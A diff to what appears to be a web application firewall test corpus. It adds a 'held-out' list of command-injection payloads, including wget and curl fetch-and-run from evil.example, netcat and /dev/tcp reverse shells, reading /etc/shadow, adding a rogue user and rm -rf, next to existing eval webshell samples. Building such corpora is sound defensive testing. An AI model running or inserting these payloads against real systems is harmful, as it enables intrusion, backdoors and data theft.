@@ -79,3 +79,21 @@ O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}
 eval($_GET['x'])
 eval(base64_decode($_REQUEST['c']))
 eval request("x")
+
+# === Held-out sample: written after the GoTestWAF fixes, then used to tune the last rules ===
+; ls -la /
+&& wget http://evil.example/x.sh -O- | sh
+; nc -e /bin/sh 10.0.0.1 4444
+|| ping -c 10 127.0.0.1
+; curl http://evil.example/$(whoami)
+a; python -c 'import os;os.system("id")'
+; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+%0Acat /etc/shadow
+; powershell -enc SQBFAFgA
+| type C:\windows\win.ini
+; /bin/sh -c id
+& net user hacker P@ss /add
+; rm -rf /tmp/x
+; echo YmFzaA== | base64 -d | sh
+; perl -e 'exec "/bin/sh"'
+$(curl evil.example|sh)
